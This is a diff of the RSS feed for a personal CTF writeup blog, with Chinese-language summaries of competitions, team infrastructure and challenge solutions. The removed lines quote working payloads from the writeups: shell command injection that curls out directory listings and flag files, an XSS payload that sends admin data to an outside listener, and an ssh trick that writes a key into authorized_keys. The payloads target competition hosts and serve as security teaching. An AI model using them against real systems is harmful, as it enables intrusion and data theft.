@@ -1,53 +1,483 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on Chumy's Blog</title><link>https://blog.chummydns.com/tags/ctf/</link><description>Recent content in CTF on Chumy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 20 Feb 2025 12:00:00 +0800</lastBuildDate><atom:link href="https://blog.chummydns.com/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2025 Final 心得</title><link>https://blog.chummydns.com/blogs/ais3-eof-2025/</link><pubDate>Thu, 20 Feb 2025 12:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2025/</guid><description>HITCON CTF 2024 Final 心得 這波 EOF 自幹全套 A&amp;amp;D 工具兼首次實戰測試大成功，只差 ELK 沒整併進來了，但能夠把上次 HITCON CTF 的一些想法實現出來也是很不錯。
-round alert 實在方便甚至跳通知比視覺化快，讓 葉東逸 跟 vincent55 可以用最快速度登入 game 完成任務。
-attack manager 第一天運行的很完美，舒服的顯示哪一隊這輪有打穿，這樣就能迅速應對更新 exploit 。
-pcap analysis 也是完美的將所有的流量整理好，也完美的分類每台電腦的流量，只可惜還是需要導入 elk 才能看。
-patch manager 第一天壞掉所以一直修，但是好險第一天沒有太多人在 patch，當天晚上將他修好測好以後第二天就完美運行，讓 三角蛇 可以快樂追 patch。但是最可惜的是賽前 WeakGod Chiu 準備的 binary diff 沒有用到。
-另外我們的超讚 crypto jeopardy 隊友 李彥佑 也是第一天就解完了超讚的。
-另外第一次試著戴一台小 server 來充當 router 兼 NAS 也是一個蠻成功的，畢竟能夠內網傳檔案也不用在自己電腦接 vpn 去比賽環境還是比較方便的。
-最後有些人問我為啥不用現成的，要客製化自己想要的功能直接自幹肯定是最快的對ㄅ（X
-最後感謝 楊竣鴻 幫我寫前端♥️</description></item><item><title>HITCON CTF 2024 Final 心得</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-final/</link><pubDate>Mon, 11 Nov 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-final/</guid><description>HITCON CTF 2024 Final 心得 承接 Quals 來聊聊決賽吧！
-前言 這次參加 HITCON CTF Final 也算是我第一次參加這種比較大型的 CTF 決賽比賽，而我基本上負責規劃與設定整個隊伍的基礎建設，並提供機器給隊友架設並設定對內的自動化攻擊與防禦系統如 attack manager 或封包工具與攻擊重送工具。由於考慮到這場有提供 game box 且不會用到會場內網然後賽中我可能要顧 infra 加上 Ching 通靈到可能有 live CTF 所以我就在場外的飯店房間總部打比賽。
-賽前準備 賽前一個月先把整個主要架構架好上好 ldap、file server、VPN 等等測試完寫好 document 然後交給 Caleb 架 attack manager 與 elk、Curious 架抓封包與重送工具，然後 Ching 架模擬環境給隊員學工具使用方式。
-賽前一天 首先比賽前一天因為剛好去取貨撿到的二手 L3 switch 想說飯店如果有網路孔會很方便還能直接打 sitetosite 就扛了一台 7 公斤的東西過去，結果房間沒網路孔只有 wifi
-晚上十點多規則放出來就要馬上工作當水管工把 tunnel 打通路由設通 MTU 調好然後測試，然後再應 Vincent55 與 kazma 需求把內網也串到社團內網上（外加幫隊友修網路（X）中途設到一半突然 jumpbox 斷線差點嚇死，結果看一下 DC 才發現是大家都斷掉，全部檢查完以後就等隔天。
-第一天 比賽第一天剛開賽的時候發現連 scoreboard 會 403 但是 live 組連的上，因為我前一天沒有想到（或者規則沒看到） scoreboard 會鎖 ip，因為我只有設定 10.</description></item><item><title>HITCON CTF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</link><pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</guid><description>hitconctf-2024-writeup 這場與 星爆吉娃娃、BambooFox、以及我們 B33f 50UP 所組成的 星爆牛炒竹狐 隊伍一起打到了世界第 24 名、台灣排名第一名，並且打進今年 HITCON CTF 決賽。
-這邊就來寫一下我解的題目 writeup。
-戰績 Flag Reader 目標是上傳一個帶有 flag.txt -&amp;gt; /flag.txt 的 symlink，但是 server 的 python 會用 tarfile 做一次 tarinfo 的檢查，檢查一定要是 file 且名字不能帶 flag.txt，檢查過才會用 subprocess 跑 busybox tar 去解檔。
-首先我先去看tarfile 定義為 isfile 的檔案類型
-REGULAR_TYPES = (REGTYPE, AREGTYPE, CONTTYPE, GNUTYPE_SPARSE) 發現 typebyte 要設成 \0、0、7、S isfile 結果才會是 true。
-最一開始我注意到 S 這個東西，發現是 GNU 特有的 type 但是不知道為何我用自己 linux 測以後，發現 tarfile 會認 Sparse file 但是 tar 不知道為何還是按照一般的檔案去解，這邊可能有待研究。</description></item><item><title>Google CTF 2024 WriteUp</title><link>https://blog.chummydns.com/blogs/google-ctf-2024/</link><pubDate>Mon, 24 Jun 2024 03:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/google-ctf-2024/</guid><description>Google CTF 2024 WriteUp 戰績 oneecho 概述 nc 進去是一個可以讓你下指令的 shell
-然而只能下 echo 不能下其他的，目測要 command injection
-到 challenge.js 來看看他怎檔的。
-首先他 require 了 bash-parser
-const parse = require(&amp;#39;bash-parser&amp;#39;); 接著他把指令 parse 成 ast
-const ast = parse(cmd); call check 做檢查
-if (!check(ast)) ( rl.write(&amp;#39;Hacker detected! No hacks, only echo!&amp;#39;); rl.close(); return; } 來看看他怎麼檢查的。
-const check = ast =&amp;gt; { if (typeof(ast) === &amp;#39;string&amp;#39;) { return true; } for (var prop in ast) { if (prop === &amp;#39;type&amp;#39; &amp;amp;&amp;amp; ast[prop] === &amp;#39;Redirect&amp;#39;) { return false; } if (prop === &amp;#39;type&amp;#39; &amp;amp;&amp;amp; ast[prop] === &amp;#39;Command&amp;#39;) { if (ast[&amp;#39;name&amp;#39;] &amp;amp;&amp;amp; ast[&amp;#39;name&amp;#39;][&amp;#39;text&amp;#39;] &amp;amp;&amp;amp; ast[&amp;#39;name&amp;#39;][&amp;#39;text&amp;#39;] !</description></item><item><title>AIS3 EOF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</link><pubDate>Mon, 08 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</guid><description>Misc Welcome 題目 Flag AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}
-Web DNS Lookup Tool: Final Webpage 解題 正常
-不存在 domain
-使用違規字元
-讀 code 找到 blacklist
-發現 $() 沒檔，測一下
-過了
-exploit #!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def root(): print(request.stream.read().decode()) return &amp;#34;com&amp;#34; @app.route(&amp;#39;/&amp;lt;path:data&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def run(data): print(data) return &amp;#34;com&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;::&amp;#34;, port=80) payload curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(ls /)&amp;#34;)&amp;#39; curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(cat /flag_SWeUMks9hGYFciax)&amp;#34;)&amp;#39; curl http://10.</description></item><item><title>TSCCTF 2024 Official WriteUp</title><link>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</link><pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</guid><description>TSCCTF 2024 Official WriteUp 這次與 TSC 的夥伴們一起舉辦了一場 CTF 比賽，而我則負責 infra 的建置以及出一題 reverse 題目，雖說我似乎難度沒有控好，還在學習控難度中。
-Just Shooting Game 基本上這題最大的難點有兩個：
-取得 magic 值 通靈出 Transfer.exec 是某種 bytecode interpreter ，然後把解出來的 code 丟 IDA 之類的解析。 解題 這題 code 用 ILSpy 逆會比較完整，但是這邊 writeup 還是用 Dnspy 寫。
-DnSpy 打開 ShootingGame_Data\Managed\Assembly-CSharp.dll 會發現有一些 Class 有一個叫 code 的 string variable 裡面塞了一坨奇怪的東西，decode 以後會發現這些都 emoji。
-這些 code 會在該 Class 裡和一個叫 magic 的變數做 Transfer.etob 運算以後，跟一些參數一起跑 Transfer.exec
-通過與 gun、enemy 等等 Class 比對後，發現 GameManager 是送入一個字串 Call Transfer.</description></item><item><title>BALSN 2023 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2023-writeup/</link><pubDate>Wed, 18 Oct 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2023-writeup/</guid><description>balsn-2023-writeup 與 B33f 50UP 戰隊一起合打的。
-戰績 KShell 連到 nc kshell.balsnctf.com 7122 會有一個受限的 shell 要做逃脫，用 help 看能用的指令只有這些，沒有 pipe 沒有 redirect
-裡面最複雜的應該是 ssh 所以從他開刀。思路大概是想辦法找到 自由寫檔 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。 原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 &amp;lt;username&amp;gt;@&amp;lt;hostname&amp;gt; Permission denied (publickey) 的 log。
-ssh -E .ssh/authorized_keys &amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy&amp;#34;@localhost 然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：Permission denied (publickey) 這就頭痛了。後來有想到用 filename。</description></item><item><title>AIS3 Pre Exam 2023 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</link><pubDate>Tue, 23 May 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</guid><description>Welcome 題目 解題 讀一下 pdf
-E-Portfolio baby 題目 解題 網頁進來是登入介面 About 那邊可以放 html 看起來可以 XSS 測一下 看起來可以 用 flask 隨便寫個 server 聽 request
-#!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def data(): print(request.args) return &amp;#34;aaa&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;0.0.0.0&amp;#34;,port=80) payload
-&amp;lt;h5&amp;gt;Hello!&amp;lt;/h5&amp;gt; I am a &amp;lt;span style=&amp;#34;color: red;&amp;#34;&amp;gt;new&amp;lt;/span&amp;gt; user. &amp;lt;img src=x onerror=&amp;#39;fetch(&amp;#34;/api/portfolio&amp;#34;).then(res =&amp;gt; res.json()).then(data =&amp;gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&amp;#39;/&amp;gt; 送去給 admin 然後就收到 flag 了 Flag AIS3{&amp;lt;img src=x onerror='fetch(...}
-ManagementSystem 題目 解題 IDA 打開 人真好有給 shell code 每個 user 的 function 找一遍後發現 delete_user 有用 gets，可以 stack overflow，先讓他跑到 &amp;quot;Invalid index.</description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</guid><description>hitconctf-2022-writeup 戰績 checker Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.
-checker.exe:
-checker_drv.sys:
-Also, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.</description></item><item><title>AIS3 Pre Exam 2022 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</link><pubDate>Tue, 17 May 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</guid><description>Score Board Welcome Welcome 題目 Flag AIS3{WTF did I just see the FLAG before CTF starts?}
-Misc Excel 題目 解題 Flag AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}
-Gift in the dream 題目 解題 binwalk gift_in_the_dream.gif 一下發現啥都沒有。 strings gift_in_the_dream.gif 一下看到一堆重複出現的奇怪字串，應該是提示。 通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。 Script #!/bin/bash for a in $(identify -format &amp;#34;%s %T \n&amp;#34; gift_in_the_dream.gif | awk &amp;#39;{print $2}&amp;#39;) do printf &amp;#34;%02X&amp;#34; $a | xxd -r -p done Flag AIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}
-Knock 題目 解題 原本以為是 Web 題，後來想想又好像不對，request 抓出來改用 curl 跑。 curl -X POST http://chals1.</description></item><item><title>AIS3 EOF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</link><pubDate>Sun, 16 Jan 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</guid><description>leetcall 題目 限制 payload # Problem 1: Hello print(getattr(&amp;#34;Hello, {:}!&amp;#34;, &amp;#39;format&amp;#39;)(getattr(&amp;#39;!\nHello, &amp;#39;, &amp;#39;join&amp;#39;)(getattr(getattr(open(0),&amp;#39;read&amp;#39;)(),&amp;#39;splitlines&amp;#39;)()))) # Problem 2: Fibonacci print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(str,map(round,map(getattr(0.4472135954999579,&amp;#39;__mul__&amp;#39;),map(getattr(1.618033988749895,&amp;#39;__pow__&amp;#39;),map(int,getattr(open(0),&amp;#39;readlines&amp;#39;)()))))))) # Problem 3: FizzBuzz getattr(&amp;#39;&amp;#39;,&amp;#39;format&amp;#39;)(setattr(__builtins__,&amp;#39;a&amp;#39;,range(1,10001)),setattr(__builtins__,&amp;#39;b&amp;#39;,list(map(bool,map(getattr(3,&amp;#39;__rmod__&amp;#39;),a)))),setattr(__builtins__,&amp;#39;c&amp;#39;,list(map(bool,map(getattr(5,&amp;#39;__rmod__&amp;#39;),a)))),print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__mul__&amp;#39;),map(str,a),map(getattr(bool,&amp;#39;__and__&amp;#39;),b,c)),map(getattr(&amp;#39;Fizz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),b))),map(getattr(&amp;#39;Buzz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),c)))))) flag FLAG{actually_you_can_also_solve_those_leetcode_challenges_in_this_way:D}
-SSRF Challenge or Not? 題目 網址 https://ssrf.h4ck3r.quest/
-解題 flag FLAG{well, maybe not? XD}</description></item><item><title>BALSN 2021 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2021-writeup/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2021-writeup/</guid><description>balsn-2021-writeup 戰績 Metaeasy 題目 server code class MasterMetaClass(type): def __new__(cls, class_name, class_parents, class_attr): def getFlag(self): print(&amp;#39;Here you go, my master&amp;#39;) with open(&amp;#39;flag&amp;#39;) as f: print(f.read()) class_attr[getFlag.__name__] = getFlag attrs = ((name, value) for name, value in class_attr.items() if not name.startswith(&amp;#39;__&amp;#39;)) class_attr = dict((&amp;#39;IWant&amp;#39;+name.upper()+&amp;#39;Plz&amp;#39;, value) for name, value in attrs) newclass = super().__new__(cls, class_name, class_parents, class_attr) return newclass def __init__(*argv): print(&amp;#39;Bad guy! No Flag !!&amp;#39;) raise &amp;#39;Illegal&amp;#39; class BalsnMetaClass(type): def getFlag(self): print(&amp;#39;You\&amp;#39;re not Master!</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on Chumy's Blog</title><link>https://blog.chummydns.com/tags/ctf/</link><description>Recent content in CTF on Chumy's Blog</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Thu, 20 Feb 2025 12:00:00 +0800</lastBuildDate><atom:link href="https://blog.chummydns.com/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2025 Final 心得</title><link>https://blog.chummydns.com/blogs/ais3-eof-2025/</link><pubDate>Thu, 20 Feb 2025 12:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2025/</guid><description>&lt;h1 id="hitcon-ctf-2024-final-心得">HITCON CTF 2024 Final 心得&lt;/h1>
+&lt;p>這波 EOF 自幹全套 A&amp;amp;D 工具兼首次實戰測試大成功，只差 ELK 沒整併進來了，但能夠把上次 HITCON CTF 的一些想法實現出來也是很不錯。&lt;/p>
+&lt;p>round alert 實在方便甚至跳通知比視覺化快，讓 葉東逸 跟 vincent55 可以用最快速度登入 game 完成任務。&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/1f733fb5-aa4b-4630-995e-7e9bb8c43b47" alt="image">&lt;/p>
+&lt;p>attack manager 第一天運行的很完美，舒服的顯示哪一隊這輪有打穿，這樣就能迅速應對更新 exploit 。&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/ef8e4bbe-0b84-4e10-bfba-f58b546e0663" alt="image">&lt;/p>
+&lt;p>pcap analysis 也是完美的將所有的流量整理好，也完美的分類每台電腦的流量，只可惜還是需要導入 elk 才能看。&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/a481b619-c2cb-4ce9-8e4e-a8e8705be99e" alt="image">&lt;/p>
+&lt;p>patch manager 第一天壞掉所以一直修，但是好險第一天沒有太多人在 patch，當天晚上將他修好測好以後第二天就完美運行，讓 三角蛇 可以快樂追 patch。但是最可惜的是賽前 WeakGod Chiu 準備的 binary diff 沒有用到。&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/35687ed3-9e9a-4d8f-816e-a28733fddd84" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/352f3f21-1ace-4ea8-8f9d-7ddb8b704fe3" alt="image">&lt;/p>
+&lt;p>另外我們的超讚 crypto jeopardy 隊友 李彥佑 也是第一天就解完了超讚的。&lt;/p>
+&lt;p>另外第一次試著戴一台小 server 來充當 router 兼 NAS 也是一個蠻成功的，畢竟能夠內網傳檔案也不用在自己電腦接 vpn 去比賽環境還是比較方便的。&lt;/p>
+&lt;p>最後有些人問我為啥不用現成的，要客製化自己想要的功能直接自幹肯定是最快的對ㄅ（X&lt;/p>
+&lt;p>最後感謝 楊竣鴻 幫我寫前端♥️&lt;/p></description></item><item><title>HITCON CTF 2024 Final 心得</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-final/</link><pubDate>Mon, 11 Nov 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-final/</guid><description>&lt;h1 id="hitcon-ctf-2024-final-心得">HITCON CTF 2024 Final 心得&lt;/h1>
+&lt;p>承接 &lt;a href="https://blog.chummydns.com/blogs/hitconctf-2024-writeup">Quals&lt;/a> 來聊聊決賽吧！&lt;/p>
+&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>這次參加 HITCON CTF Final 也算是我第一次參加這種比較大型的 CTF 決賽比賽，而我基本上負責規劃與設定整個隊伍的基礎建設，並提供機器給隊友架設並設定對內的自動化攻擊與防禦系統如 attack manager 或封包工具與攻擊重送工具。由於考慮到這場有提供 game box 且不會用到會場內網然後賽中我可能要顧 infra 加上 Ching 通靈到可能有 live CTF 所以我就在場外的飯店房間總部打比賽。&lt;/p>
+&lt;h2 id="賽前準備">賽前準備&lt;/h2>
+&lt;p>賽前一個月先把整個主要架構架好上好 ldap、file server、VPN 等等測試完寫好 document 然後交給 Caleb 架 attack manager 與 elk、Curious 架抓封包與重送工具，然後 Ching 架模擬環境給隊員學工具使用方式。&lt;/p>
+&lt;h2 id="賽前一天">賽前一天&lt;/h2>
+&lt;p>首先比賽前一天因為剛好去取貨撿到的二手 L3 switch 想說飯店如果有網路孔會很方便還能直接打 sitetosite 就扛了一台 7 公斤的東西過去，結果房間沒網路孔只有 wifi&lt;/p>
+&lt;p>晚上十點多規則放出來就要馬上工作當水管工把 tunnel 打通路由設通 MTU 調好然後測試，然後再應 Vincent55 與 kazma 需求把內網也串到社團內網上（外加幫隊友修網路（X）中途設到一半突然 jumpbox 斷線差點嚇死，結果看一下 DC 才發現是大家都斷掉，全部檢查完以後就等隔天。&lt;/p>
+&lt;h2 id="第一天">第一天&lt;/h2>
+&lt;p>比賽第一天剛開賽的時候發現連 scoreboard 會 403 但是 live 組連的上，因為我前一天沒有想到（或者規則沒看到） scoreboard 會鎖 ip，因為我只有設定 10.102.0.0/16，當時意識到在開賽一分鐘內光速把路由調好然後發公告要條 wireguard 的 allowips 以後基本上現場組跟飯店總部都能順利連線開始打了，然後接著幫竹區那邊 sync vpn 設定（他們似乎沒注意到公告）。&lt;/p></description></item><item><title>HITCON CTF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</link><pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</guid><description>&lt;h1 id="hitconctf-2024-writeup">hitconctf-2024-writeup&lt;/h1>
+&lt;p>這場與 &lt;code>星爆吉娃娃&lt;/code>、&lt;code>BambooFox&lt;/code>、以及我們 &lt;code>B33f 50UP&lt;/code> 所組成的 &lt;code>星爆牛炒竹狐&lt;/code> 隊伍一起打到了世界第 24 名、台灣排名第一名，並且打進今年 HITCON CTF 決賽。&lt;/p>
+&lt;p>這邊就來寫一下我解的題目 writeup。&lt;/p>
+&lt;h2 id="戰績">戰績&lt;/h2>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/1f60d911-041b-4419-9eb3-b1cfe0e46feb" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/4278d28e-9f26-4ef1-9ebb-443a0a18adce" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/fb014145-7e99-4cb2-8f6d-b3e50ee87d4d" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/f33a0522-3ffc-4306-a5f3-b9f7a180bb7b" alt="image">&lt;/p>
+&lt;h2 id="flag-reader">Flag Reader&lt;/h2>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/a3a33711-1427-4d0b-ab7b-c1c11c218d55" alt="image">&lt;/p>
+&lt;p>目標是上傳一個帶有 flag.txt -&amp;gt; /flag.txt 的 symlink，但是 server 的 python 會用 tarfile 做一次 tarinfo 的檢查，檢查一定要是 file 且名字不能帶 flag.txt，檢查過才會用 subprocess 跑 busybox tar 去解檔。&lt;/p>
+&lt;p>首先我先去看&lt;a href="https://github.com/python/cpython/blob/b455a5a55cb1fd5bb6178a969e8ebd0e6e91b610/Lib/tarfile.py#L122">tarfile 定義為 isfile 的檔案類型&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>REGULAR_TYPES &lt;span style="color:#f92672">=&lt;/span> (REGTYPE, AREGTYPE,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CONTTYPE, GNUTYPE_SPARSE)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>發現 typebyte 要設成 &lt;code>\0&lt;/code>、&lt;code>0&lt;/code>、&lt;code>7&lt;/code>、&lt;code>S&lt;/code> isfile 結果才會是 true。&lt;/p>
+&lt;p>最一開始我注意到 &lt;code>S&lt;/code> 這個東西，發現是 &lt;a href="https://www.gnu.org/software/tar/manual/html_section/Sparse-Formats.html">GNU 特有的 type&lt;/a> 但是不知道為何我用自己 linux 測以後，發現 &lt;code>tarfile&lt;/code> 會認 Sparse file 但是 &lt;code>tar&lt;/code> 不知道為何還是按照一般的檔案去解，這邊可能有待研究。&lt;/p></description></item><item><title>Google CTF 2024 WriteUp</title><link>https://blog.chummydns.com/blogs/google-ctf-2024/</link><pubDate>Mon, 24 Jun 2024 03:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/google-ctf-2024/</guid><description>&lt;h1 id="google-ctf-2024-writeup">Google CTF 2024 WriteUp&lt;/h1>
+&lt;h2 id="戰績">戰績&lt;/h2>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/102ab7a2-a951-47de-9dfa-5732cb2cc83a" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/225aff8b-6771-4163-8635-fe91b0cbc17e" alt="image">&lt;/p>
+&lt;h2 id="oneecho">oneecho&lt;/h2>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d55e3843-2a4a-4b99-8fea-b46791dbec0d" alt="image">&lt;/p>
+&lt;h3 id="概述">概述&lt;/h3>
+&lt;p>&lt;code>nc&lt;/code> 進去是一個可以讓你下指令的 shell&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c11bebbe-800a-47c0-a3aa-72e693661878" alt="image">&lt;/p>
+&lt;p>然而只能下 &lt;code>echo&lt;/code> 不能下其他的，目測要 command injection&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4a39314d-020c-4a20-a70c-edb727830d2e" alt="image">&lt;/p>
+&lt;p>到 &lt;code>challenge.js&lt;/code> 來看看他怎檔的。&lt;/p>
+&lt;p>首先他 require 了 &lt;code>bash-parser&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">parse&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;bash-parser&amp;#39;&lt;/span>); 
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接著他把指令 parse 成 ast&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">parse&lt;/span>(&lt;span style="color:#a6e22e">cmd&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>call &lt;code>check&lt;/code> 做檢查&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#a6e22e">ast&lt;/span>)) (
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rl&lt;/span>.&lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Hacker detected! No hacks, only echo!&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rl&lt;/span>.&lt;span style="color:#a6e22e">close&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
